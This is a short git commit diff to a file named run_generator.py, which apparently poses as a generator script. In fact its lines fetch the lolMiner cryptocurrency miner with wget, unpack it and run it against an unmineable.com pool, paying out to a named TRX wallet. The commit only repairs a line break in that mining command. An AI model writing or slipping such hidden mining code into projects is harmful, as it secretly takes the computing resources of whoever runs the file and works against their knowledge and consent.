3f7489ead31b7d862f1c03d94caa2968c2ea34ee
Vandeptrai789 <92248590+Vandeptrai789@users.noreply.github.com>
2021-10-10 16:21:10 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -2,5 +2,4 @@ import os as alpha
 alpha.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz")
 alpha.system("tar -xf lolMiner_v1.29_Lin64.tar.gz")            
 alpha.system("cd 1.29")             
-alpha.system("./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TQVGNG2cEFq8iAQ54rZ56SAmnCM2msZY64#ek61-6h9x --ethstratum ETHPROXY
-             ")
+alpha.system("./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TQVGNG2cEFq8iAQ54rZ56SAmnCM2msZY64#ek61-6h9x --ethstratum ETHPROXY")
